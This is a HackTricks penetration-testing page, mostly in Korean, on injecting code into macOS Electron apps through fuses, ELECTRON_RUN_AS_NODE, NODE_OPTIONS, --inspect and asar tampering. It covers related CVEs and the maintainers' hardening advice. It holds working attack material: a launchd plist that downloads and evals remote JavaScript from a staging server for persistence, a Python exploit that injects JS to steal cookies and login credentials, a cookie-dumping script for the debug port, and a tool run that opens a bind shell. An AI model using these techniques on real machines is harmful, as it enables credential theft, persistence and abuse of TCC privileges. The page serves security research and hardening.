# macOS Electron Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Basic Information

Electron이 무엇인지 모른다면 [**여기에서 많은 정보를 찾을 수 있습니다**](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). 하지만 지금은 Electron이 **node**를 실행한다는 것만 알면 됩니다.\
그리고 node에는 **지정된 파일** 외에 **다른 코드를 실행**하는 데 사용할 수 있는 **매개변수**와 **환경 변수**가 있습니다.

### Electron Fuses

이 기술들은 다음에 논의될 것이지만, 최근 Electron은 이를 방지하기 위해 여러 **보안 플래그**를 추가했습니다. 이것이 바로 [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses)이며, 이는 macOS에서 Electron 앱이 **임의의 코드를 로드하는 것을 방지**하는 데 사용됩니다:

- **`RunAsNode`**: 비활성화되면 코드 주입을 위해 환경 변수 **`ELECTRON_RUN_AS_NODE`**의 사용을 방지합니다.
- **`EnableNodeCliInspectArguments`**: 비활성화되면 `--inspect`, `--inspect-brk`와 같은 매개변수가 무시됩니다. 이를 통해 코드 주입을 피할 수 있습니다.
- **`EnableEmbeddedAsarIntegrityValidation`**: 활성화되면 로드된 **`asar`** **파일**이 macOS에 의해 **검증**됩니다. 이 파일의 내용을 수정하여 **코드 주입**을 방지합니다.
- **`OnlyLoadAppFromAsar`**: 이 옵션이 활성화되면 다음 순서로 로드하는 대신: **`app.asar`**, **`app`** 및 마지막으로 **`default_app.asar`**. 오직 app.asar만 확인하고 사용하므로, **`embeddedAsarIntegrityValidation`** 퓨즈와 결합할 때 **검증되지 않은 코드를 로드하는 것이 불가능**합니다.
- **`LoadBrowserProcessSpecificV8Snapshot`**: 활성화되면 브라우저 프로세스는 `browser_v8_context_snapshot.bin`이라는 파일을 V8 스냅샷으로 사용합니다.

코드 주입을 방지하지 않는 또 다른 흥미로운 퓨즈는:

- **EnableCookieEncryption**: 활성화되면 디스크의 쿠키 저장소가 OS 수준의 암호화 키를 사용하여 암호화됩니다.

### Checking Electron Fuses

응용 프로그램에서 **이 플래그를 확인할 수 있습니다**:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Electron 퓨즈 수정

As the [**docs mention**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), the configuration of the **Electron Fuses** are configured inside the **Electron binary** which contains somewhere the string **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.

In macOS applications this is typically in `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
이 파일을 [https://hexed.it/](https://hexed.it/)에서 열고 이전 문자열을 검색할 수 있습니다. 이 문자열 뒤에는 각 퓨즈가 비활성화되었는지 활성화되었는지를 나타내는 ASCII 숫자 "0" 또는 "1"이 표시됩니다. 헥스 코드를 수정하여 **퓨즈 값을 수정**할 수 있습니다 (`0x30`은 `0`이고 `0x31`은 `1`입니다).

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

이 바이트가 수정된 상태로 **`Electron Framework` 바이너리**를 애플리케이션 내에서 **덮어쓰려** 하면 앱이 실행되지 않습니다.

## RCE 전자 애플리케이션에 코드 추가

Electron 앱이 사용하는 **외부 JS/HTML 파일**이 있을 수 있으므로, 공격자는 이러한 파일에 코드를 주입하여 서명이 확인되지 않고 앱의 컨텍스트에서 임의의 코드를 실행할 수 있습니다.

> [!CAUTION]
> 그러나 현재 2가지 제한 사항이 있습니다:
>
> - 앱을 수정하려면 **`kTCCServiceSystemPolicyAppBundles`** 권한이 **필요**하므로 기본적으로 더 이상 가능하지 않습니다.
> - 컴파일된 **`asap`** 파일은 일반적으로 퓨즈 **`embeddedAsarIntegrityValidation`** `및` **`onlyLoadAppFromAsar`**가 `활성화`되어 있습니다.
>
> 이로 인해 공격 경로가 더 복잡해지거나 불가능해집니다.

**`kTCCServiceSystemPolicyAppBundles`** 요구 사항을 우회하는 것이 가능하다는 점에 유의하십시오. 애플리케이션을 다른 디렉토리(예: **`/tmp`**)로 복사하고, 폴더 **`app.app/Contents`**의 이름을 **`app.app/NotCon`**으로 변경한 후, **악성** 코드로 **asar** 파일을 **수정**하고 다시 **`app.app/Contents`**로 이름을 바꾼 다음 실행할 수 있습니다.

다음 명령어로 asar 파일에서 코드를 추출할 수 있습니다:
```bash
npx asar extract app.asar app-decomp
```
그리고 수정한 후 다시 패킹하십시오:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE with ELECTRON_RUN_AS_NODE

According to [**the docs**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node), 이 환경 변수가 설정되면 프로세스가 일반 Node.js 프로세스로 시작됩니다.
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> 만약 퓨즈 **`RunAsNode`**가 비활성화되어 있다면, 환경 변수 **`ELECTRON_RUN_AS_NODE`**는 무시되며, 이 방법은 작동하지 않습니다.

### 앱 Plist에서의 주입

[**여기에서 제안된 대로**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/) 이 환경 변수를 plist에서 악용하여 지속성을 유지할 수 있습니다:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE with `NODE_OPTIONS`

페이로드를 다른 파일에 저장하고 실행할 수 있습니다:
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
> [!CAUTION]
> 만약 퓨즈 **`EnableNodeOptionsEnvironmentVariable`** 가 **비활성화** 되어 있다면, 앱은 env 변수 **NODE_OPTIONS** 를 무시하고 실행됩니다. 단, env 변수 **`ELECTRON_RUN_AS_NODE`** 가 설정되어 있지 않으면, 퓨즈 **`RunAsNode`** 가 비활성화된 경우에도 무시됩니다.
>
> **`ELECTRON_RUN_AS_NODE`** 를 설정하지 않으면, 다음과 같은 **오류**를 발견하게 됩니다: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`

### 앱 Plist에서의 주입

이 env 변수를 plist에서 악용하여 지속성을 유지하기 위해 다음 키를 추가할 수 있습니다:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE with inspecting

According to [**this**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), if you execute an Electron application with flags such as **`--inspect`**, **`--inspect-brk`** and **`--remote-debugging-port`**, a **debug port will be open** so you can connect to it (for example from Chrome in `chrome://inspect`) and you will be able to **inject code on it** or even launch new processes.\
예를 들어:
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
In [**이 블로그 포스트**](https://hackerone.com/reports/1274695)에서, 이 디버깅은 헤드리스 크롬이 **임의의 파일을 임의의 위치에 다운로드**하도록 악용됩니다.

> [!TIP]
> 앱이 `--inspect`와 같은 환경 변수나 매개변수를 확인하는 고유한 방법이 있다면, `--inspect-brk` 인수를 사용하여 런타임에서 이를 **우회**해 볼 수 있습니다. 이 인수는 앱의 시작 부분에서 **실행을 중지**하고 우회(예: 현재 프로세스의 인수나 환경 변수를 덮어쓰기)를 실행합니다.

다음은 `--inspect-brk` 매개변수로 앱을 모니터링하고 실행함으로써, 그 앱이 가진 사용자 정의 보호를 우회할 수 있었던 익스플로잇입니다(프로세스의 매개변수를 덮어써서 `--inspect-brk`를 제거하고, 그런 다음 JS 페이로드를 주입하여 앱에서 쿠키와 자격 증명을 덤프하는 방식).
```python
import asyncio
import websockets
import json
import requests
import os
import psutil
from time import sleep

INSPECT_URL = None
CONT = 0
CONTEXT_ID = None
NAME = None
UNIQUE_ID = None

JS_PAYLOADS = """
var { webContents } = require('electron');
var fs = require('fs');

var wc = webContents.getAllWebContents()[0]


function writeToFile(filePath, content) {
const data = typeof content === 'string' ? content : JSON.stringify(content, null, 2);

fs.writeFile(filePath, data, (err) => {
if (err) {
console.error(`Error writing to file ${filePath}:`, err);
} else {
console.log(`File written successfully at ${filePath}`);
}
});
}

function get_cookies() {
intervalIdCookies = setInterval(() => {
console.log("Checking cookies...");
wc.session.cookies.get({})
.then((cookies) => {
tokenCookie = cookies.find(cookie => cookie.name === "token");
if (tokenCookie){
writeToFile("/tmp/cookies.txt", cookies);
clearInterval(intervalIdCookies);
wc.executeJavaScript(`alert("Cookies stolen and written to /tmp/cookies.txt")`);
}
})
}, 1000);
}

function get_creds() {
in_location = false;
intervalIdCreds = setInterval(() => {
if (wc.mainFrame.url.includes("https://www.victim.com/account/login")) {
in_location = true;
console.log("Injecting creds logger...");
wc.executeJavaScript(`
(function() {
email = document.getElementById('login_email_id');
password = document.getElementById('login_password_id');
if (password && email) {
return email.value+":"+password.value;
}
})();
`).then(result => {
writeToFile("/tmp/victim_credentials.txt", result);
})
}
else if (in_location) {
wc.executeJavaScript(`alert("Creds stolen and written to /tmp/victim_credentials.txt")`);
clearInterval(intervalIdCreds);
}
}, 10); // Check every 10ms
setTimeout(() => clearInterval(intervalId), 20000); // Stop after 20 seconds
}

get_cookies();
get_creds();
console.log("Payloads injected");
"""

async def get_debugger_url():
"""
Fetch the local inspector's WebSocket URL from the JSON endpoint.
Assumes there's exactly one debug target.
"""
global INSPECT_URL

url = "http://127.0.0.1:9229/json"
response = requests.get(url)
data = response.json()
if not data:
raise RuntimeError("No debug targets found on port 9229.")
# data[0] should contain an object with "webSocketDebuggerUrl"
ws_url = data[0].get("webSocketDebuggerUrl")
if not ws_url:
raise RuntimeError("webSocketDebuggerUrl not found in inspector data.")
INSPECT_URL = ws_url


async def monitor_victim():
print("Monitoring victim process...")
found = False
while not found:
sleep(1)  # Check every second
for process in psutil.process_iter(attrs=['pid', 'name']):
try:
# Check if the process name contains "victim"
if process.info['name'] and 'victim' in process.info['name']:
found = True
print(f"Found victim process (PID: {process.info['pid']}). Terminating...")
os.kill(process.info['pid'], 9)  # Force kill the process
except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
# Handle processes that might have terminated or are inaccessible
pass
os.system("open /Applications/victim.app --args --inspect-brk")

async def bypass_protections():
global CONTEXT_ID, NAME, UNIQUE_ID
print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]

sleep(1)

await send_cmd(ws, "Debugger.enable", {"maxScriptsCacheSize": 10000000})

await send_cmd(ws, "Profiler.enable")

await send_cmd(ws, "Debugger.setBlackboxPatterns", {"patterns": ["/node_modules/|/browser_components/"], "skipAnonnymous": False})

await send_cmd(ws, "Runtime.runIfWaitingForDebugger")

await send_cmd(ws, "Runtime.executionContextCreated", get_first=False, params={"context": {"id": CONTEXT_ID, "origin": "", "name": NAME, "uniqueId": UNIQUE_ID, "auxData": {"isDefault": True}}})

code_to_inject = """process['argv'] = ['/Applications/victim.app/Contents/MacOS/victim']"""
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression": code_to_inject, "uniqueContextId":UNIQUE_ID})
print("Injected code to bypass protections")


async def js_payloads():
global CONT, CONTEXT_ID, NAME, UNIQUE_ID

print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]
await send_cmd(ws, "Runtime.compileScript", get_first=False, params={"expression":JS_PAYLOADS,"sourceURL":"","persistScript":False,"executionContextId":1})
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression":JS_PAYLOADS,"objectGroup":"console","includeCommandLineAPI":True,"silent":False,"returnByValue":False,"generatePreview":True,"userGesture":False,"awaitPromise":False,"replMode":True,"allowUnsafeEvalBlockedByCSP":True,"uniqueContextId":UNIQUE_ID})



async def main():
await monitor_victim()
sleep(3)
await get_debugger_url()
await bypass_protections()

sleep(7)

await js_payloads()



async def send_cmd(ws, method, get_first=False, params={}):
"""
Send a command to the inspector and read until we get a response with matching "id".
"""
global CONT

CONT += 1

# Send the command
await ws.send(json.dumps({"id": CONT, "method": method, "params": params}))
sleep(0.4)

# Read messages until we get our command result
while True:
response = await ws.recv()
data = json.loads(response)

# Print for debugging
print(f"[{method} / {CONT}] ->", data)

if get_first:
return data

# If this message is a response to our command (by matching "id"), break
if data.get("id") == CONT:
return data

# Otherwise it's an event or unrelated message; keep reading

if __name__ == "__main__":
asyncio.run(main())
```
> [!CAUTION]
> 만약 퓨즈 **`EnableNodeCliInspectArguments`**가 비활성화되어 있다면, 앱은 **노드 매개변수**(예: `--inspect`)를 무시하고 실행되며, 환경 변수 **`ELECTRON_RUN_AS_NODE`**가 설정되지 않는 한 무시됩니다. 또한 퓨즈 **`RunAsNode`**가 비활성화되어 있으면 이 변수도 **무시됩니다**.
>
> 그러나 **electron 매개변수 `--remote-debugging-port=9229`**를 사용하여 Electron 앱에서 **히스토리**(GET 명령어로)나 브라우저의 **쿠키**를 훔칠 수 있습니다(브라우저 내에서 **복호화**되며, 이를 제공하는 **json 엔드포인트**가 있습니다).

이 방법에 대해서는 [**여기**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)와 [**여기**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)에서 배울 수 있으며, 자동 도구 [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut)이나 다음과 같은 간단한 스크립트를 사용할 수 있습니다:
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
### Injection from the App Plist

이 env 변수를 plist에서 악용하여 지속성을 유지할 수 있습니다. 다음 키를 추가하세요:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## TCC 우회 구버전 악용

> [!TIP]
> macOS의 TCC 데몬은 실행된 애플리케이션의 버전을 확인하지 않습니다. 따라서 **이전 기술로 Electron 애플리케이션에 코드를 주입할 수 없는 경우** APP의 이전 버전을 다운로드하고 그 위에 코드를 주입할 수 있습니다. 그러면 여전히 TCC 권한을 받을 수 있습니다(Trust Cache가 이를 방지하지 않는 한).

## 비 JS 코드 실행

이전 기술을 사용하면 **Electron 애플리케이션의 프로세스 내에서 JS 코드를 실행**할 수 있습니다. 그러나 **자식 프로세스는 부모 애플리케이션과 동일한 샌드박스 프로필에서 실행되며** TCC 권한을 **상속**합니다.\
따라서 예를 들어 카메라나 마이크에 접근하기 위해 권한을 악용하고 싶다면, **프로세스에서 다른 바이너리를 실행**하면 됩니다.

## 주목할 만한 Electron macOS 취약점 (2023-2024)

### CVE-2023-44402 – ASAR 무결성 우회

Electron ≤22.3.23 및 다양한 23-27 프리 릴리스는 `.app/Contents/Resources` 폴더에 쓰기 권한이 있는 공격자가 `embeddedAsarIntegrityValidation` **및** `onlyLoadAppFromAsar` 퓨즈를 우회할 수 있게 했습니다. 이 버그는 무결성 검사기에서 발생한 *파일 유형 혼동*으로, 검증된 아카이브 대신 **`app.asar`라는 이름의 디렉토리**가 로드되도록 했습니다. 따라서 해당 디렉토리에 배치된 모든 JavaScript는 앱이 시작될 때 실행되었습니다. 하드닝 가이드를 따르고 두 퓨즈를 모두 활성화한 공급업체조차도 macOS에서 여전히 취약했습니다.

패치된 Electron 버전: **22.3.24**, **24.8.3**, **25.8.1**, **26.2.1** 및 **27.0.0-alpha.7**. 이전 빌드를 실행 중인 애플리케이션을 발견한 공격자는 `Contents/Resources/app.asar`를 자신의 디렉토리로 덮어써서 애플리케이션의 TCC 권한으로 코드를 실행할 수 있습니다.

### 2024 “RunAsNode” / “enableNodeCliInspectArguments” CVE 클러스터

2024년 1월, 일련의 CVE(CVE-2024-23738부터 CVE-2024-23743까지)가 많은 Electron 앱이 여전히 **RunAsNode** 및 **EnableNodeCliInspectArguments** 퓨즈를 활성화한 상태로 배포된다는 점을 강조했습니다. 따라서 로컬 공격자는 환경 변수 `ELECTRON_RUN_AS_NODE=1` 또는 `--inspect-brk`와 같은 플래그를 사용하여 프로그램을 다시 시작하여 *일반* Node.js 프로세스로 전환하고 애플리케이션의 모든 샌드박스 및 TCC 권한을 상속받을 수 있습니다.

Electron 팀은 “치명적” 등급에 이의를 제기하고 공격자가 이미 로컬 코드 실행이 필요하다고 언급했지만, 이 문제는 포스트 익스플로잇 중에 여전히 가치가 있습니다. 왜냐하면 취약한 Electron 번들을 *자원 활용* 바이너리로 전환하여 예를 들어 연락처, 사진 또는 이전에 데스크탑 앱에 부여된 기타 민감한 리소스를 읽을 수 있기 때문입니다.

Electron 유지 관리자의 방어 지침:

* 프로덕션 빌드에서 `RunAsNode` 및 `EnableNodeCliInspectArguments` 퓨즈를 비활성화하십시오.
* 애플리케이션이 정당하게 도우미 Node.js 프로세스가 필요하다면, 이러한 퓨즈를 다시 활성화하는 대신 최신 **UtilityProcess** API를 사용하십시오.

## 자동 주입

- [**electroniz3r**](https://github.com/r3ggi/electroniz3r)

도구 [**electroniz3r**](https://github.com/r3ggi/electroniz3r)는 **취약한 Electron 애플리케이션**을 쉽게 찾아서 그 위에 코드를 주입하는 데 사용할 수 있습니다. 이 도구는 **`--inspect`** 기술을 사용하려고 시도합니다:

직접 컴파일해야 하며 다음과 같이 사용할 수 있습니다:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
- [https://github.com/boku7/Loki](https://github.com/boku7/Loki)

Loki는 Electron 애플리케이션의 JavaScript 파일을 Loki Command & Control JavaScript 파일로 교체하여 백도어를 설계했습니다.


## References

- [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85](https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85)
- [https://www.electronjs.org/blog/statement-run-as-node-cves](https://www.electronjs.org/blog/statement-run-as-node-cves)
- [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

{{#include ../../../banners/hacktricks-training.md}}
